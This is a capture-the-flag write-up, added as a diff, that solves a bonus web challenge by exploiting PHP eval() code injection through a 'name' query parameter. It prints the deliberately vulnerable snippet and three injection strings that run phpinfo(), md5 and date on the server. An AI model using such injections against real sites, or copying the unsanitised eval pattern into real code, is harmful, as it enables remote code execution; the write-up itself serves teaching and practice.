@@ -1,0 +1,49 @@
+Break the URL:
+
+
+This is the bonus challenge of the contest and this gets unlocked only if the participants complete all the remaining 8 challenges.
+
+In this challenge, it is given that we have no answer but we have to print something in the web page to solve the challenge.
+
+Lets try to see the source file of the web page..
+
+There is a clue given in the source file.... We have to provide a query string to the URL to see the response from the server
+
+When we provide the query string, for eg:     ?name=SaraGuru
+
+The response from the server was      'Welcome SaraGuru!!!!!'
+
+Lets try to give some special characters to break the query string like a double quote (")
+
+Fortunately, it threw an error and gave an opening for getting the answer for this challenge..
+
+The error was  " ParseError: syntax error, unexpected '"."' (T_CONSTANT_ENCAPSED_STRING), expecting ',' or ';' in /var/www/html/source_code/challenges/Binary Source Code/challenge9.php(48) : eval()'d code:1 Stack trace: #0 {main} "
+
+Here the error was in the eval() function of the php file :):)
+
+(Note: The eval() function evaluates a string as PHP code.The string must be valid PHP code and must end with semicolon.)
+
+Lets try to see how the eval() function is used for printing the string....
+
+<?php
+            $x = $_GET['name'];
+					 	eval("echo \"Welcome \".\"$x\".\"!!!!!\";"); 
+?>
+
+Since we have the php code for using the eval(), lets try to reverse it....
+
+1) Printing the phpinfo():
+          ?name="; phpinfo(); "
+          
+2) Printing the md5 hash of 'source code':
+          ?name="; echo md5("source code"); "
+          
+3) Printing the time of the server:
+          ?name="; echo date("h:i:sa"); "
+          
+      
+In all the above three cases, we manually close the double quotes and use semicolon to end the statement and then inject our required statemtent. Then finally open the double quotes that you closed before :):)
+
+
+As simple as that!!!!!
+
